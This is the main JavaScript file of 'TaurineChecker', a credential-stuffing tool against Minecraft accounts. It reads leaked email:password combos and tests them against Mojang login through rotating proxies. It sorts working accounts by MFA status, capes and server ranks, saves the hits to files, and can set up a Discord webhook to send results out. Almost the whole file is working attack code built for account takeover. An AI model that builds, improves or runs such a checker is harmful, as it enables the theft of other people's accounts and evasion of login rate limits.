const fs = require("fs")
const {
    version
} = require("os")
const sequelize = require('sequelize')
const handler = require("./src/handler")
const chalk = require("chalk")
const wait = require('system-sleep')
const Discord = require('discord.js')
const clear = require('console-clear');
const figlet = require("figlet");
const logUpdate = require('log-update');
let config;

module.exports.def = {
    overviewmode: false,
    statsmode: false,
    version: 0.1,
    headers: {
        "Content-Type": "application/json",
        'Pragma': 'no-cache'
    },
    hit: {
        optifine: 0,
        funcraft: 0,
        nfa: 0,
        fa: 0,
        mfa: 0,
        labymod: 0,
        minecon: 0,
        hypixel: 0,
    },
    bad: {
        optifine: 0,
        funcraft: 0,
        mc: 0,
        mfa: 0,
        labymod: 0,
        minecon: 0,
        hypixel: 0,
    }
}

let line = 7
const process = require("process")
const rdl = require("readline")
class LoadingBar {
    constructor(size) {
        this.size = size
        this.cursor = 0
        this.timer = null
    }
    start() {
        process.stdout.write("\x1B[?25l")
        process.stdout.write("[")
        for (let i = 0; i < this.size; i++) {
            process.stdout.write("-")
        }
        process.stdout.write("]")
        this.cursor = 1
        rdl.cursorTo(process.stdout, this.cursor, line);
        this.timer = setInterval(() => {
            process.stdout.write("=")
            this.cursor++;
            if (this.cursor >= this.size) {
                clearTimeout(this.timer)
                process.stdout.write("\x1B[?25h")
            }
        }, 100)
    }
}
const ld = new LoadingBar(50)
clear();

let showFiglet = async (o) => {
    console.log(`${chalk.red(figlet.textSync(`TaurineChecker`))} v${this.def.version} by D0wzy (https://github.com/D0wzy)${o ? `\nMode: ${o.mode}`: ``}`);
}

let showStats = async () => {
    if (this.def.statsmode) {
        let start = async () => {
            if (!this.def.stopped) {
                var timeout = setTimeout(async () => {
                    logUpdate(`\n${chalk.underline('» Stats:')}
・MFA: ${chalk.green(this.def.hit.mfa)}
・NFA: ${chalk.green(this.def.hit.nfa)}
・SFA: ${chalk.green(this.def.hit.fa)}
・Cape OptiFine: ${chalk.green(this.def.hit.optifine)}
・Cape Minecon: ${chalk.green(this.def.hit.minecon)}
・LabyMod Cape: ${chalk.green(this.def.hit.labymod)}
・Ranked FunCraft: ${chalk.green(this.def.hit.funcraft)}
・Ranked Hypixel: ${chalk.green(this.def.hit.hypixel)}
    
・Total Hit: ${chalk.green(this.def.hit.nfa + this.def.hit.fa + this.def.hit.mfa)}
・Total Bad: ${chalk.red(this.def.bad.mc)}`);
                    start()
                }, 100)
            }
        }
        this.def.stopStat = async () => {
            clearTimeout(timeout)
        }
        return start()
    }
}


showFiglet()

const timeout = async () => {
    setTimeout(async () => {
        process.title = `💉・TaurineChecker | Hit: ${this.def.hit.nfa + this.def.hit.fa + this.def.hit.mfa} | Bad: ${this.def.bad.mc} | Optifine Caped: ${this.def.hit.optifine} | Minecon Caped: ${this.def.hit.minecon} | CPM: 0 | Checked: 0%`
        timeout()

        //process.stdout.clearLine();
        //clear()
    }, 100)
}


timeout()

if (!fs.existsSync('./results')) {
    fs.mkdirSync('./results');
}

if (!fs.existsSync('./results/bad.txt')) {
    fs.writeFile('./results/bad.txt', '', async () => {})
}

if (!fs.existsSync('./results/hit.txt')) {
    fs.writeFile('./results/hit.txt', '', async () => {})
}

if (!fs.existsSync("./config.json")) {
    handler.checkConfig().then(async (content) => {
        fs.writeFile('./config.json', content, async () => {
            config = JSON.parse(fs.readFileSync("./config.json"))

            if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])

            if (!fs.existsSync('./results/optifine') && config.Options.CheckOptifine) {
                fs.mkdirSync('./results/optifine');
            }
            
            if (!fs.existsSync('./results/minecon') && config.Options.CheckMinecon) {
                fs.mkdirSync('./results/minecon');
            }
            
            if (!fs.existsSync('./results/funcraft') && config.Options.CheckFunCraft) {
                fs.mkdirSync('./results/funcraft');
            }
            
            if (!fs.existsSync('./results/hypixel') && config.Options.CheckHypixel) {
                fs.mkdirSync('./results/hypixel');
            }
            if (!fs.existsSync('./results/mfa') && config.Options.CheckMFA) {
                fs.mkdirSync('./results/mfa');
            }
        })
    })
} else {
    config = JSON.parse(fs.readFileSync("./config.json"))
    if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])

    if (!fs.existsSync('./results/optifine') && config.Options.CheckOptifine) {
        fs.mkdirSync('./results/optifine');
    }
    
    if (!fs.existsSync('./results/minecon') && config.Options.CheckMinecon) {
        fs.mkdirSync('./results/minecon');
    }
    
    if (!fs.existsSync('./results/funcraft') && config.Options.CheckFunCraft) {
        fs.mkdirSync('./results/funcraft');
    }
    
    if (!fs.existsSync('./results/hypixel') && config.Options.CheckHypixel) {
        fs.mkdirSync('./results/hypixel');
    }
    if (!fs.existsSync('./results/mfa') && config.Options.CheckMFA) {
        fs.mkdirSync('./results/mfa');
    }
}

handler.checkUpdate().then(async (v) => {
    if (this.def.version < v) {
        throw Error(chalk.red(chalk.italic("Your version is outdated !")))
    }
})

let userProxies = []
let proxies = []
let psize = 0
let asize = 0

const initCheck = async () => {
    fs.readFile(`./combo.txt`, async (err, data) => {
        data = data.toString();
        const acc = data.split("\r\n")
        let i = 0;
        asize = acc.length

        if (config.UseProxy) {
            fs.readFile(`./proxies.txt`, async (err, data) => {
                data = data.toString();
                const lines = data.split("\r\n");

                psize = lines.length
            })
        }

        if (this.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("INFO")}] Now cheking ${asize} accounts${config.UseProxy ? ` using ${psize} prox${psize > 1 ? 'ies' : 'y'}` : `.`}\n`)


        acc.forEach(async (a) => {
            let mail = a.split(":")[0]
            let pw = a.split(":")[1]

            const init = async () => {

                if (config.UseProxy) {
                    fs.readFile(`./proxies.txt`, async (err, data) => {
                        data = data.toString();
                        const lines = data.split("\r\n");

                        psize = lines.length

                        if (!lines[i]) i = 0
                        //console.log("cc")

                        handler.checkMojang({
                            mail: mail,
                            password: pw,
                            useProxy: true,
                            proxy: {
                                ip: lines[i].split(":")[0],
                                port: lines[i].split(":")[1],
                            }
                        }).then(async (res) => {
                            if (!res) {
                                handler.throwBadMojang({
                                    mail: mail,
                                    password: pw,
                                    proxy: {
                                        ip: lines[i].split(":")[0],
                                        port: lines[i].split(":")[1],
                                    }
                                })
                            } else {
                                handler.throwHitMojang({
                                    mail: mail,
                                    password: pw,
                                    type: res.type,
                                    username: res.username,
                                    proxy: {
                                        ip: lines[i].split(":")[0],
                                        port: lines[i].split(":")[1],
                                    }
                                })

                                if (config.Options.CheckOptifine) {
                                    handler.checkOptifine(res).then(async (s) => {
                                        if (!s) {
                                            handler.throwBadOF({
                                                res,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        } else {
                                            handler.throwHitOF({
                                                res,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        }
                                    })
                                }

                                if (config.Options.CheckMFA) {
                                    handler.checkMFA({
                                        mail: mail,
                                        password: pw,
                                        proxy: {
                                            ip: lines[i].split(":")[0],
                                            port: lines[i].split(":")[1],
                                        }
                                    }).then(async (res) => {
                                        if (res) {
                                            handler.throwHitMFA({
                                                mail: mail,
                                                password: pw,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        } else {
                                            handler.throwBadMFA({
                                                mail: mail,
                                                password: pw,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        }
                                    })
                                }

                                if (config.Options.CheckFunCraft) {
                                    handler.checkFuncraft(res).then(async (s) => {
                                        if (s.neverConnected) return handler.throwBadFC({
                                            username: res.username,
                                            mail: mail,
                                            password: res.password,
                                            neverConnected: true
                                        })
                                        if (s.rank === "Joueur") {
                                            handler.throwBadFC({
                                            username: res.username,
                                            mail: mail,
                                            password: res.password,
                                            neverConnected: true
                                            })
                                        } else {
                                            handler.throwHitFC({
                                                rank: s.rank,
                                                username: res.username,
                                                mail: mail,
                                                password: res.password
                                            })
                                        }
                                    })
                                }
                            }
                            i++
                        })
                    })
                } else {
                    handler.checkMojang({
                        mail: mail,
                        password: pw,
                        useProxy: false
                    }).then(async (res) => {
                        i++;
                        if (!res) {
                            handler.throwBadMojang({
                                mail: mail,
                                password: pw
                            })
                        } else {
                            handler.throwHitMojang({
                                mail: mail,
                                password: pw,
                                type: res.type,
                                username: res.username
                            })

                            if (config.Options.CheckOptifine) {
                                handler.checkOptifine(res).then(async (s) => {
                                    if (!s) {
                                        handler.throwBadOF(res)
                                    } else {
                                        handler.throwHitOF(res)
                                    }
                                })
                            }

                            if (config.Options.CheckMFA) {
                                handler.checkMFA({
                                    mail: mail,
                                    password: pw
                                }).then(async (res) => {
                                    if (res) {
                                        handler.throwHitMFA({
                                            mail: mail,
                                            password: pw
                                        })
                                    } else {
                                        handler.throwBadMFA({
                                            mail: mail,
                                            password: pw
                                        })
                                    }
                                })
                            }

                            if (config.Options.CheckFunCraft) {
                                handler.checkFuncraft(res).then(async (s) => {
                                    if (s.neverConnected) return handler.throwBadFC({
                                        username: res.username,
                                        mail: mail,
                                        password: res.password,
                                        neverConnected: true
                                    })
                                    if (s.rank == "Joueur") {
                                        handler.throwBadFC({
                                            rank: s.rank,
                                            username: res.username,
                                            mail: mail,
                                            password: res.password
                                        })
                                    } else {
                                        handler.throwHitFC({
                                            rank: s.rank,
                                            username: res.username,
                                            mail: mail,
                                            password: res.password
                                        })
                                    }
                                })
                            }
                        }
                    })
                }
            }
            init();

            wait(config.Cooldown)
            i++
        })
    })
}


process.stdin.setRawMode(true);
process.stdin.resume();

const readline = require('readline');
readline.emitKeypressEvents(process.stdin);
process.stdin.setRawMode(true);
process.stdin.on('keypress', (str, key) => {
    //console.log(key)
    if (key.ctrl && key.name === 'c') {
        process.exit();
    } else if (key.name === '1' && !this.def.started) {
        clear()
        showFiglet()
        process.stdout.write("Loading...")
        process.stdout.cursorTo(0, line);
        ld.start()

        wait(5500)
        initCheck()
        this.def.started = true
        this.def.overviewmode = true
        this.def.statsmode = false
        clear();
        showFiglet()
    } else if (key.name === '2' && !this.def.started) {
        clear()
        showFiglet()
        process.stdout.write("Loading...")
        process.stdout.cursorTo(0, line);
        ld.start()

        wait(5500)
        initCheck()
        this.def.started = true
        this.def.statsmode = true
        this.def.overviewmode = false
        clear();
        showFiglet()
        showStats()
    } else if (key.sequence === "\r" && key.name === "return" && this.def.started) {
        clear()

        if (this.def.overviewmode && !this.def.statsmode) {
            this.def.overviewmode = false
            this.def.statsmode = true
            this.def.stopped = false
            logUpdate.clear()
            clear();
            showFiglet({
                mode: "Stats"
            })
            showStats()
        } else {
            clear();
            this.def.overviewmode = true
            this.def.statsmode = false

            this.def.stopStat()
            this.def.stopped = true

            showFiglet({
                mode: "Overview"
            })
        }
    }
});

process.stdout.write(`${chalk.underline('» Select your mode:')}
[${chalk.red("1")}]・Overview Mode
[${chalk.red("2")}]・Stats Mode

To switch mode, press ${chalk.bold("CTRL + M")}`);